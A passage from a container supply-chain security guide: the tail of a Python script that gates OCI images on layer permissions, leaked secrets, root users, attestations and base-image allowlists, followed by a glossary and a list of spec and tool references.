                    gone = [p for p in sensitive if p == target or p.startswith(target + "/")]
                for p in gone:
                    f.add("error", "layer.deleted-secret",
                          f"/{p} was deleted in layer {idx} but is still retrievable from layer {sensitive[p]}",
                          platform)
                continue

            mode = m.mode
            if m.isfile() or m.isdir():
                if mode & (stat.S_ISUID | stat.S_ISGID) and "/" + name not in allow_suid:
                    f.add("error", "layer.setuid", f"{where} mode {oct(mode)}", platform)
                if mode & 0o002 and not (m.isdir() and mode & stat.S_ISVTX):
                    f.add("warn", "layer.world-writable", f"{where} mode {oct(mode)}", platform)
            if m.ischr() or m.isblk():
                f.add("warn", "layer.device-file", where, platform)
            if m.isfile() and m.size > policy["max_single_file_bytes"]:
                f.add("warn", "layer.large-file", f"{where} is {m.size} bytes", platform)

            for rx in forbidden:
                if rx.search(name):
                    f.add("error", "layer.forbidden-path", f"{where} matches {rx.pattern}", platform)
                    sensitive[name] = idx
                    break

            if m.isfile() and 0 < m.size <= max_scan:
                fh = tf.extractfile(m)
                data = fh.read() if fh else b""
                for rx in secrets:
                    if rx.search(data):
                        f.add("error", "layer.secret-content", f"{where} matches {rx.pattern.decode()}", platform)
                        sensitive[name] = idx
                        break
    # drain the tar end-of-archive padding so the diffID covers the whole stream
    while hr.read(1 << 20):
        pass
    raw.close()
    return "sha256:" + hr.h.hexdigest(), hr.n


def check_config(cfg: dict, platform: str, policy: dict, epoch: int | None, f: Findings) -> dict:
    c = cfg.get("config") or {}
    user = (c.get("User") or "").strip()
    if policy["forbid_root_user"] and user.split(":")[0] in ("", "root", "0"):
        f.add("error", "config.root-user", f"image runs as root (User={user!r}); set USER to a numeric non-root uid", platform)

    key_rx = re.compile(policy["secret_env_key_regex"])
    for kv in c.get("Env") or []:
        k = kv.split("=", 1)[0]
        if key_rx.search(k) and k not in policy["allow_env_keys"]:
            f.add("error", "config.secret-env", f"ENV {k} looks like a secret baked into the image config", platform)

    labels = c.get("Labels") or {}
    for lbl in policy["required_labels"]:
        if not labels.get(lbl):
            f.add("error", "config.missing-label", f"required label {lbl} missing", platform)

    hist_rx = re.compile(policy["history_secret_regex"])
    for i, h in enumerate(cfg.get("history") or []):
        cb = h.get("created_by", "")
        mm = hist_rx.search(cb)
        if mm:
            f.add("error", "config.history-secret",
                  f"history[{i}] exposes {mm.group(0).split('=')[0]}=... (use RUN --mount=type=secret)", platform)

    if epoch is not None:
        want = datetime.fromtimestamp(epoch, tz=timezone.utc)
        got = cfg.get("created")
        if got:
            try:
                g = datetime.fromisoformat(got.replace("Z", "+00:00"))
                if g != want:
                    f.add("warn", "config.timestamp", f"created={got} != SOURCE_DATE_EPOCH {want.isoformat()}", platform)
            except ValueError:
                f.add("warn", "config.timestamp", f"unparseable created={got}", platform)
    return {"user": user, "labels": labels}


def base_images(predicate: dict, ptype: str) -> list[dict]:
    if ptype.endswith("/v1"):
        deps = (predicate.get("buildDefinition") or {}).get("resolvedDependencies") or []
    else:
        deps = predicate.get("materials") or []
    return [d for d in deps if str(d.get("uri", "")).startswith("pkg:docker/")]


# --------------------------------------------------------------------------- main
def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--layout", required=True, help="OCI layout directory (buildx --output type=oci,tar=false)")
    ap.add_argument("--policy", help="JSON policy file; keys override DEFAULT_POLICY")
    ap.add_argument("--report", required=True)
    ap.add_argument("--extract-dir", help="write SBOM/provenance predicates and digests.json here")
    ap.add_argument("--source-date-epoch", type=int)
    ap.add_argument("--github-output", action="store_true", help="append index_digest/platform_digests to $GITHUB_OUTPUT")
    a = ap.parse_args()

    policy = dict(DEFAULT_POLICY)
    if a.policy:
        with open(a.policy) as fh:
            policy.update(json.load(fh))

    f = Findings()
    lay = Layout(a.layout, f)
    with open(os.path.join(a.layout, "index.json")) as fh:
        root = json.load(fh)

    # ---- locate the image (index) that will be pushed
    tops = root.get("manifests") or []
    if len(tops) != 1:
        print(f"expected exactly 1 entry in index.json, found {len(tops)}", file=sys.stderr)
        return 2
    top = tops[0]
    if top["mediaType"] in INDEX_TYPES:
        image_index = lay.json_blob(top)
        children = image_index.get("manifests") or []
    elif top["mediaType"] in MANIFEST_TYPES:
        children = [top]
    else:
        print(f"unsupported top-level mediaType {top['mediaType']}", file=sys.stderr)
        return 2

    images: dict[str, dict] = {}      # manifest digest -> info
    attestations: dict[str, dict] = {}  # image manifest digest -> attestation manifest
    for d in children:
        ann = d.get("annotations") or {}
        if ann.get("vnd.docker.reference.type") == "attestation-manifest":
            attestations[ann["vnd.docker.reference.digest"]] = d
        elif d["mediaType"] in MANIFEST_TYPES:
            images[d["digest"]] = {"desc": d, "platform": platform_str(d.get("platform"))}
        elif d["mediaType"] in INDEX_TYPES:
            f.add("error", "layout.nested-index", f"nested index {d['digest']} not supported")

    report_platforms: dict[str, dict] = {}
    found_platforms = {v["platform"] for v in images.values()}
    for p in policy["require_platforms"]:
        if p not in found_platforms:
            f.add("error", "index.missing-platform", f"required platform {p} not in image index")

    base_rx = [re.compile(r) for r in policy["allowed_base_image_regexes"]]
    if a.extract_dir:
        os.makedirs(a.extract_dir, exist_ok=True)

    for mdigest, info in images.items():
        plat = info["platform"]
        manifest = lay.json_blob(info["desc"])
        cfg = lay.json_blob(manifest["config"])
        layers = manifest.get("layers") or []
        diff_ids = (cfg.get("rootfs") or {}).get("diff_ids") or []
        summary = check_config(cfg, plat, policy, a.source_date_epoch, f)

        if len(layers) > policy["max_layers"]:
            f.add("error", "image.too-many-layers", f"{len(layers)} layers > {policy['max_layers']}", plat)
        if len(layers) != len(diff_ids):
            f.add("error", "image.diffid-count", f"{len(layers)} layers but {len(diff_ids)} diff_ids", plat)

        total, state = 0, {}
        for i, ldesc in enumerate(layers):
            if not lay.verify_blob(ldesc):
                continue
            diff_id, usize = scan_layer(lay, ldesc, i, plat, policy, state, f)
            total += usize
            if diff_id and i < len(diff_ids) and diff_id != diff_ids[i]:
                f.add("error", "image.diffid-mismatch", f"layer {i}: uncompressed {diff_id} != config {diff_ids[i]}", plat)
        if total > policy["max_uncompressed_bytes"]:
            f.add("error", "image.too-large", f"uncompressed size {total} > {policy['max_uncompressed_bytes']}", plat)

        # ---- BuildKit attestations for this platform
        sbom_pkgs, bases, have_sbom, have_prov = None, [], False, False
        att = attestations.get(mdigest)
        if att:
            am = lay.json_blob(att)
            for l in am.get("layers") or []:
                ptype = (l.get("annotations") or {}).get("in-toto.io/predicate-type", "")
                stmt = lay.json_blob(l)
                pred = stmt.get("predicate") or {}
                safe = plat.replace("/", "_")
                if ptype in SBOM_PREDICATES:
                    have_sbom = True
                    sbom_pkgs = len(pred.get("packages") or pred.get("components") or [])
                    if a.extract_dir:
                        ext = "spdx.json" if "spdx" in ptype else "cdx.json"
                        with open(os.path.join(a.extract_dir, f"{safe}.sbom.{ext}"), "w") as out:
                            json.dump(pred, out)
                elif ptype in PROVENANCE_PREDICATES:
                    have_prov = True
                    bases = base_images(pred, ptype)
                    if a.extract_dir:
                        with open(os.path.join(a.extract_dir, f"{safe}.buildkit-provenance.json"), "w") as out:
                            json.dump(pred, out)
        if policy["require_sbom"] and not have_sbom:
            f.add("error", "attest.missing-sbom", "no SBOM attestation (build with --sbom=true)", plat)
        if policy["require_provenance"] and not have_prov:
            f.add("error", "attest.missing-provenance", "no provenance attestation (build with --provenance=mode=max)", plat)
        if base_rx:
            for b in bases:
                uri = b["uri"].split("?", 1)[0]
                if not any(rx.search(uri) for rx in base_rx):
                    f.add("error", "attest.base-not-allowed", f"base/build image {uri} not in allowlist", plat)

        report_platforms[plat] = {
            "manifestDigest": mdigest,
            "configDigest": manifest["config"]["digest"],
            "layers": len(layers),
            "uncompressedBytes": total,
            "user": summary["user"],
            "sbomPackages": sbom_pkgs,
            "baseImages": [{"uri": b["uri"], "digest": b.get("digest")} for b in bases],
        }

    result = "pass" if f.errors() == 0 else "fail"
    report = {
        "gateVersion": "1",
        "evaluatedAt": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "imageDigest": top["digest"],
        "result": result,
        "errorCount": f.errors(),
        "policy": {k: policy[k] for k in sorted(policy)},
        "platforms": report_platforms,
        "findings": f.items,
    }
    os.makedirs(os.path.dirname(os.path.abspath(a.report)), exist_ok=True)
    with open(a.report, "w") as out:
        json.dump(report, out, indent=2)

    digests = {"index": top["digest"], "platforms": {p: v["manifestDigest"] for p, v in report_platforms.items()}}
    if a.extract_dir:
        with open(os.path.join(a.extract_dir, "digests.json"), "w") as out:
            json.dump(digests, out, indent=2)
    if a.github_output and os.environ.get("GITHUB_OUTPUT"):
        with open(os.environ["GITHUB_OUTPUT"], "a") as out:
            out.write(f"index_digest={top['digest']}\n")
            out.write(f"platform_digests={json.dumps(digests['platforms'])}\n")
            out.write(f"result={result}\n")

    for item in f.items:
        print(f"[{item['severity'].upper():5}] {item['platform']:<14} {item['check']:<26} {item['message']}")
    print(f"\nimage {top['digest']} -> {result.upper()} ({f.errors()} errors)")
    return 0 if result == "pass" else 1


if __name__ == "__main__":
    sys.exit(main())
```

Ideas to extend it: flag files owned by uid 0 that are writable (`mode & 0o022`) in app dirs; require `/etc/passwd` to contain the configured UID; diff the final filesystem against an approved manifest; grep the BuildKit provenance predicate for secret patterns (§13.7); emit SARIF so findings appear in GitHub code scanning.

---

## Appendix B — Glossary

| Term | Meaning |
|---|---|
| Blob | Any content-addressed byte sequence in a registry |
| Descriptor | `{mediaType, digest, size, …}` pointer to a blob |
| Manifest | JSON listing a config + layers (image) or a single artifact |
| Index | JSON listing manifests (multi-arch "manifest list") |
| Config | JSON with runtime defaults, `rootfs.diff_ids`, history; its digest = image ID |
| diffID | sha256 of an uncompressed layer tar |
| chainID | hash identifying a stack of layers |
| Whiteout | `.wh.<name>` file in a layer marking deletion |
| Referrer | Manifest whose `subject` points to another manifest |
| Fallback tag | `sha256-<hex>` tag emulating referrers on old registries |
| LLB | BuildKit's low-level build graph |
| Frontend | Converter from Dockerfile (etc.) to LLB, itself an image |
| in-toto Statement | `{subject, predicateType, predicate}` claim about artifacts |
| DSSE | Signing envelope used for in-toto statements |
| Predicate | The body of an attestation (SBOM, provenance, …) |
| SLSA | Supply-chain Levels for Software Artifacts (build track L0–L3) |
| VSA | Verification Summary Attestation |
| Fulcio / Rekor / TUF | Sigstore CA / transparency log / trust-root distribution |
| Sigstore bundle | Signature + cert/key + log proof/timestamp in one JSON |
| Trust store / trust policy | Notation's set of trusted certs / mapping of scopes to required identities |
| TSA | RFC 3161 time-stamping authority |
| purl | Package URL, e.g. `pkg:golang/golang.org/x/net@v0.38.0` |
| VEX | Statement of (non-)exploitability of a CVE for a product |

---

## Appendix C — References

Specs
- OCI image-spec & distribution-spec (v1.1): <https://github.com/opencontainers/image-spec>, <https://github.com/opencontainers/distribution-spec>
- in-toto attestation framework: <https://github.com/in-toto/attestation>
- SLSA v1.x: <https://slsa.dev/spec/>
- DSSE: <https://github.com/secure-systems-lab/dsse>
- SPDX: <https://spdx.dev> · CycloneDX: <https://cyclonedx.org> · OpenVEX: <https://openvex.dev>

Tools
- BuildKit / buildx attestations: <https://docs.docker.com/build/metadata/attestations/>
- Sigstore docs: <https://docs.sigstore.dev> · cosign releases (v3 notes): <https://github.com/sigstore/cosign/releases>
- Notary Project / Notation: <https://notaryproject.dev> · <https://github.com/notaryproject/notation>
- GitHub artifact attestations: <https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations>
- slsa-github-generator: <https://github.com/slsa-framework/slsa-github-generator>
- Kyverno ImageValidatingPolicy: <https://kyverno.io/docs/policy-types/image-validating-policy/>
- crane / skopeo / oras / regctl: <https://github.com/google/go-containerregistry>, <https://github.com/containers/skopeo>, <https://oras.land>, <https://regclient.org>
- zizmor: <https://github.com/zizmorcore/zizmor> · harden-runner: <https://github.com/step-security/harden-runner> · diffoci: <https://github.com/reproducible-containers/diffoci>
